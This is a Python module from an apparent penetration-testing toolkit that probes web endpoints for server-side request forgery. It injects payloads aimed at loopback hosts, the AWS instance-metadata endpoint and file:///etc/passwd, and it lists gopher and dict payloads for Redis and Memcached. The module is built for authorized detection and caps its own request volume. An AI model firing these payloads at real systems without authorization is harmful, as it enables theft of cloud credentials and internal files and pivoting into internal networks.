"""Server-Side Request Forgery (SSRF) probe.

Best-effort, black-box detection of SSRF in a target endpoint. redkit does not
bundle an out-of-band (OAST) server, so blind/fully-async SSRF that only
manifests as a callback to an operator-controlled listener cannot be
*confirmed* here -- when the operator supplies ``callback``, this module fires
the probes and leaves a note telling them to watch their own listener.

What this module *can* detect without OAST, per response:

  * Cloud-metadata content reflected back (AWS IMDS-style body content) when a
    ``http://169.254.169.254/...`` payload is injected.
  * Local file content reflected back (``/etc/passwd``-style content) when a
    ``file:///etc/passwd`` payload is injected.
  * Internal-fetch error strings leaking into the response body (connection
    refused, DNS-resolution failures, language-specific HTTP client
    exceptions) that indicate the target itself tried to reach the injected
    URL.
  * A response that differs materially (status / length / timing) from a
    per-parameter benign control request -- a weak, low-confidence signal on
    its own, always reported as such.

Design constraints (redkit invariants):
    * NO AI/LLM usage -- every decision here is a deterministic rule.
    * Pure standard library (``urllib``, ``re``, ``uuid``). No third-party
      imports.
    * Imports and runs on both Windows and Linux; no OS-specific calls.
    * Offline-first: nothing is downloaded; no bundled OAST server is used or
      required (best-effort only).
    * Safe defaults: bounded per-request timeout via the shared HTTP client,
      a small capped thread pool, and hard caps on the number of candidate
      parameters/payloads/requests so a single run cannot turn into a flood.
      Uses GET by default; a state-changing POST is only sent when the
      operator explicitly sets ``method=POST``.

For AUTHORIZED security testing only.
"""
from __future__ import annotations

import re
import uuid
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

from redkit.core.http import WEB_COMMON_OPTIONS, Response, client_from_opts
from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

# --------------------------------------------------------------------------- #
# tuning constants (all conservative / bounded)
# --------------------------------------------------------------------------- #
MAX_CANDIDATES = 6      # max number of (location, param) pairs probed
MAX_AUTO_PARAMS = 6     # when nothing url-like is found, try this many known names
MAX_PAYLOADS = 6        # max distinct SSRF payloads tried per candidate
MAX_TOTAL_PROBES = 48   # hard ceiling on payload probe requests for one run
THREAD_CAP = 10         # concurrent probe workers (<= redkit's 20-thread cap)
BODY_SAMPLE = 200_000   # chars of response body inspected for signal regexes

CONTROL_VALUE = "http://example.com/redkit-ssrf-control"  # benign, real, external

# Parameter names commonly used to pass a URL/host/path to the server side.
KNOWN_PARAM_NAMES = [
    "url", "uri", "next", "redirect", "dest", "callback", "image", "file",
    "path", "feed", "host", "domain", "page", "src",
]

# Real payloads that are actually sent (each is (label, value)).
BASE_PAYLOADS: List[Tuple[str, str]] = [
    ("internal-loopback-ip", "http://127.0.0.1/"),
    ("internal-loopback-name", "http://localhost/"),
    ("cloud-metadata-aws", "http://169.254.169.254/latest/meta-data/"),
    ("local-file-read", "file:///etc/passwd"),
]

# Manual-only hints: urllib has no gopher/dict support and these can trigger
# state-changing actions on internal services, so they are reported for the
# operator to try with a dedicated tool (e.g. curl, gopherus), never sent.
MANUAL_ONLY_HINTS = [
    "gopher://127.0.0.1:6379/_%0d%0aCONFIG%20GET%20*%0d%0a "
    "(Redis probe via Gopher smuggling -- manual only, urllib has no gopher support)",
    "dict://127.0.0.1:11211/stats "
    "(Memcached probe via Dict -- manual only, urllib has no dict support)",
    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a "
    "(raw HTTP-over-Gopher to pivot to another internal port -- manual only)",
]

CLOUD_META_RE = re.compile(
    r"(ami-id|instance-id|iam/security-credentials|local-ipv4|public-keys/|"
    r"placement/region|instance-action|hostname\s*:\s*ip-\d)",
    re.I,
)
LOCAL_FILE_RE = re.compile(r"root:.*:0:0:", re.I)
ERROR_LEAK_RE = re.compile(
    r"(connection refused|econnrefused|no route to host|getaddrinfo failed|"
    r"name or service not known|could not resolve host|failed to connect to|"
    r"cURL error \d+|SSL certificate problem|connection timed out|"
    r"urlopen error|requests\.exceptions\.\w+Error|"
    r"java\.net\.(?:ConnectException|UnknownHostException)|"
    r"System\.Net\.(?:WebException|Sockets\.SocketException))",
    re.I,
)


@dataclass
class _Baseline:
    """A per-parameter benign-control response used for diffing."""

    status: int
    length: int
    elapsed: float
    error: Optional[str]


@register
class Ssrf(Module):
    """Best-effort black-box SSRF probe (no bundled OAST server)."""

    name = "web.ssrf"
    description = "Server-Side Request Forgery probe (best-effort, no OAST server bundled)"
    phase = "web"
    options = [
        Option(
            "url",
            help="target URL, e.g. http://host/app?url=http://example.com",
            required=True,
        ),
        Option(
            "param",
            default="",
            help="parameter name to target (default: auto-detect url-like params)",
        ),
        Option(
            "callback",
            default="",
            help=(
                "operator-controlled URL/host to inject as an out-of-band canary "
                "(no bundled OAST server -- you must watch it yourself)"
            ),
        ),
        Option(
            "method",
            default="GET",
            choices=["GET", "POST"],
            help="HTTP method used for probes",
        ),
        Option(
            "data",
            default="",
            help="urlencoded POST body, e.g. 'a=1&url=http://x' (used when method=POST)",
        ),
    ] + WEB_COMMON_OPTIONS
    references = [
        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
        "https://portswigger.net/web-security/ssrf",
        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
    ]

    # ------------------------------------------------------------------ run
    def run(self, opts: Dict[str, object], ctx) -> Result:
        console = ctx.console

        raw_url = str(opts["url"]).strip()
        if "://" not in raw_url:
            raw_url = "http://" + raw_url
        parsed = urllib.parse.urlsplit(raw_url)
        if not parsed.hostname:
            return Result(ok=False, summary=f"invalid url: {opts['url']!r} (expected http(s)://host/...)")
        host = parsed.hostname
        ctx.engagement.add_host(host)

        method = str(opts.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            method = "GET"
        raw_data = str(opts.get("data") or "")
        param_opt = str(opts.get("param") or "").strip()
        callback_opt = str(opts.get("callback") or "").strip()

        client = client_from_opts(opts)

        # -- reachability check: don't spend the probe budget on a dead host
        initial = self._do_request(client, method, raw_url, raw_data)
        if initial.error and initial.status == 0:
            summary = f"{raw_url} unreachable: {initial.error}"
            console.warn(summary)
            ctx.engagement.add_note(f"web.ssrf: {summary}")
            return Result(ok=False, summary=summary, data={"url": raw_url, "error": initial.error, "suspected": []})

        # -- candidate parameters ------------------------------------------------
        query_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        body_pairs = urllib.parse.parse_qsl(raw_data, keep_blank_values=True) if (method == "POST" and raw_data) else []
        candidates = self._select_candidates(param_opt, query_pairs, body_pairs)
        candidates = candidates[:MAX_CANDIDATES]

        # -- payloads --------------------------------------------------------
        token = uuid.uuid4().hex[:12]
        payloads = list(BASE_PAYLOADS)
        callback_url = None
        if callback_opt:
            netloc = callback_opt
            if "://" in callback_opt:
                netloc = urllib.parse.urlsplit(callback_opt).netloc or callback_opt
            callback_url = f"http://{netloc}/redkit-ssrf-{token}"
            payloads.append(("operator-callback", callback_url))
            ctx.engagement.add_note(
                f"web.ssrf: sent out-of-band canary requests toward {callback_url} -- "
                f"redkit bundles no OAST server, so watch your own listener/logs for an "
                f"inbound hit carrying token '{token}' to confirm blind SSRF."
            )
        payloads = payloads[:MAX_PAYLOADS]

        if not candidates:
            summary = f"{raw_url}: no url-like parameter found to test for SSRF"
            console.warn(summary)
            ctx.engagement.add_note(f"web.ssrf: {summary}")
            return Result(
                ok=True,
                summary=summary,
                data={
                    "url": raw_url, "host": host, "method": method,
                    "candidates": [], "probes": [], "suspected": [],
                    "manual_hints": MANUAL_ONLY_HINTS,
                },
            )

        console.info(
            f"ssrf probe: {raw_url} -- {len(candidates)} candidate param(s) x "
            f"{len(payloads)} payload(s), method={method}"
        )

        # -- per-parameter benign-control baseline ---------------------------
        baselines: Dict[Tuple[str, str], _Baseline] = {}
        for location, name in candidates:
            target_url, target_data = self._apply(raw_url, raw_data, location, name, CONTROL_VALUE)
            resp = self._do_request(client, method, target_url, target_data)
            baselines[(location, name)] = _Baseline(
                status=resp.status, length=resp.length, elapsed=resp.elapsed, error=resp.error,
            )

        # -- payload probes, threaded and capped ------------------------------
        tasks = [
            (location, name, label, payload)
            for (location, name) in candidates
            for (label, payload) in payloads
        ][:MAX_TOTAL_PROBES]

        def _probe(location: str, name: str, label: str, payload: str):
            target_url, target_data = self._apply(raw_url, raw_data, location, name, payload)
            resp = self._do_request(client, method, target_url, target_data)
            return location, name, label, payload, resp

        probe_results: List[Tuple[str, str, str, str, Response]] = []
        workers = max(1, min(THREAD_CAP, len(tasks)))
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [pool.submit(_probe, *task) for task in tasks]
            for fut in as_completed(futures):
                try:
                    probe_results.append(fut.result())
                except Exception:  # noqa: BLE001 - a single probe must never abort the run
                    continue

        probes: List[Dict[str, object]] = []
        suspected: List[Dict[str, object]] = []
        for location, name, label, payload, resp in probe_results:
            baseline = baselines[(location, name)]
            signals, confidence, note = self._analyze(resp, baseline, label)
            entry = {
                "param": name,
                "location": location,
                "label": label,
                "payload": payload,
                "status": resp.status,
                "length": resp.length,
                "elapsed": round(resp.elapsed, 3),
                "error": resp.error,
                "signals": signals,
                "confidence": confidence,
                "note": note,
            }
            probes.append(entry)
            if signals:
                suspected.append(entry)
                title = f"Suspected SSRF via '{name}' parameter ({label}) [{confidence}-confidence]"
                desc = (
                    f"Injecting {payload!r} into the {location} parameter '{name}' at {raw_url} "
                    f"produced signal(s): {', '.join(signals)}. {note}".strip()
                )
                ctx.engagement.add_finding(
                    title,
                    severity="high",
                    host=host,
                    description=desc,
                    evidence=f"param={name} location={location} payload={payload} signals={signals}",
                )
                if confidence == "high":
                    console.bad(f"suspected SSRF: {name} ({location}) -> {label} [{confidence}]")
                else:
                    console.warn(f"suspected SSRF: {name} ({location}) -> {label} [{confidence}]")

        probes.sort(key=lambda e: (0 if e["signals"] else 1, str(e["param"]), str(e["label"])))

        data: Dict[str, object] = {
            "url": raw_url,
            "host": host,
            "method": method,
            "candidates": [{"location": loc, "param": name} for loc, name in candidates],
            "callback": callback_opt or None,
            "callback_token": token if callback_opt else None,
            "probes": probes,
            "suspected": suspected,
            "manual_hints": MANUAL_ONLY_HINTS,
        }

        artifacts = self._write_artifact(ctx, host, data)

        summary = (
            f"{raw_url}: probed {len(candidates)} param(s) x {len(payloads)} payload(s) "
            f"({len(tasks)} request(s)); {len(suspected)} suspected SSRF signal(s)"
        )
        if callback_url:
            summary += f"; callback canary sent to {callback_url} (verify via your own OOB listener)"
        ctx.engagement.add_note(f"web.ssrf: {summary}")
        return Result(ok=True, summary=summary, data=data, artifacts=artifacts)

    # ------------------------------------------------------------- helpers
    @staticmethod
    def _select_candidates(
        param_opt: str,
        query_pairs: List[Tuple[str, str]],
        body_pairs: List[Tuple[str, str]],
    ) -> List[Tuple[str, str]]:
        """Return an ordered, de-duplicated ``(location, name)`` candidate list."""
        query_keys = [k for k, _ in query_pairs]
        body_keys = [k for k, _ in body_pairs]
        out: List[Tuple[str, str]] = []
        seen: set = set()

        def add(loc: str, name: str) -> None:
            key = (loc, name)
            if key not in seen:
                seen.add(key)
                out.append(key)

        if param_opt:
            if param_opt in query_keys:
                add("query", param_opt)
            if param_opt in body_keys:
                add("body", param_opt)
            if not out:
                # operator-specified param absent everywhere -- inject it fresh
                add("query", param_opt)
            return out

        for k in query_keys:
            if k.lower() in KNOWN_PARAM_NAMES:
                add("query", k)
        for k in body_keys:
            if k.lower() in KNOWN_PARAM_NAMES:
                add("body", k)
        if not out:
            # nothing obviously url-like present -- try the common names fresh
            for name in KNOWN_PARAM_NAMES[:MAX_AUTO_PARAMS]:
                add("query", name)
        return out

    @staticmethod
    def _apply(url: str, data: str, location: str, name: str, value: str) -> Tuple[str, str]:
        if location == "query":
            return _set_query_param(url, name, value), data
        return url, _set_body_param(data, name, value)

    @staticmethod
    def _do_request(client, method: str, url: str, data: str) -> Response:
        if method == "POST":
            headers = {"Content-Type": "application/x-www-form-urlencoded"} if data else None
            return client.post(url, data=data or None, headers=headers)
        return client.get(url)

    @staticmethod
    def _analyze(resp: Response, baseline: "_Baseline", label: str) -> Tuple[List[str], str, str]:
        """Return (signals, confidence, human-readable note) for one probe."""
        signals: List[str] = []
        confidence: Optional[str] = None
        notes: List[str] = []

        text = resp.text[:BODY_SAMPLE] if resp.body else ""

        if label == "cloud-metadata-aws" and text and CLOUD_META_RE.search(text):
            signals.append("cloud-metadata-content")
            confidence = "high"
            notes.append(
                "response body contains AWS instance-metadata-like content "
                "(ami-id / instance-id / iam-credentials path)"
            )

        if label == "local-file-read" and text and LOCAL_FILE_RE.search(text):
            signals.append("local-file-content")
            confidence = "high"
            notes.append("response body contains /etc/passwd-like content (root:x:0:0:)")

        if text:
            match = ERROR_LEAK_RE.search(text)
            if match:
                signals.append("internal-fetch-error-leak")
                if confidence is None:
                    confidence = "medium"
                notes.append(f"response leaks an internal-fetch error message: {match.group(0)[:80]!r}")

        if resp.error and not baseline.error:
            signals.append("request-errored-after-injection")
            if confidence is None:
                confidence = "low"
            notes.append(
                f"request failed after injecting the payload ({str(resp.error)[:120]}) while the "
                f"benign control succeeded -- possibly an internal fetch hang/crash, verify manually"
            )

        if not baseline.error:
            diffs: List[str] = []
            if resp.status and baseline.status and resp.status != baseline.status:
                diffs.append(f"status {baseline.status}->{resp.status}")
            threshold = max(80, int(baseline.length * 0.25))
            if resp.body and abs(resp.length - baseline.length) > threshold:
                diffs.append(f"length delta {resp.length - baseline.length}")
            if baseline.elapsed and resp.elapsed > max(2.0, baseline.elapsed * 4):
                diffs.append(f"timing {baseline.elapsed:.2f}s -> {resp.elapsed:.2f}s (possible internal fetch hang)")
            if diffs:
                if not signals:
                    signals.append("response-diff-vs-control")
                    confidence = "low"
                notes.append("differs from the benign-control baseline (" + "; ".join(diffs) + ")")

        return signals, (confidence or "none"), " ".join(notes)

    @staticmethod
    def _write_artifact(ctx, host: str, data: Dict[str, object]) -> List[str]:
        import json

        artifacts: List[str] = []
        try:
            safe_host = (host or "target").replace(":", "_")
            path = ctx.artifact_path(f"ssrf_{safe_host}.json")
            path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
            artifacts.append(str(path))
        except OSError:
            pass
        return artifacts


# --------------------------------------------------------------------------- #
# pure URL/body param helpers
# --------------------------------------------------------------------------- #
def _set_query_param(url: str, name: str, value: str) -> str:
    """Return ``url`` with query parameter ``name`` set to ``value`` (added if absent)."""
    parts = urllib.parse.urlsplit(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    found = False
    new_pairs: List[Tuple[str, str]] = []
    for k, v in pairs:
        if k == name:
            new_pairs.append((k, value))
            found = True
        else:
            new_pairs.append((k, v))
    if not found:
        new_pairs.append((name, value))
    new_query = urllib.parse.urlencode(new_pairs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


def _set_body_param(data: str, name: str, value: str) -> str:
    """Return a urlencoded body string with ``name`` set to ``value`` (added if absent)."""
    pairs = urllib.parse.parse_qsl(data, keep_blank_values=True)
    found = False
    new_pairs: List[Tuple[str, str]] = []
    for k, v in pairs:
        if k == name:
            new_pairs.append((k, value))
            found = True
        else:
            new_pairs.append((k, v))
    if not found:
        new_pairs.append((name, value))
    return urllib.parse.urlencode(new_pairs)
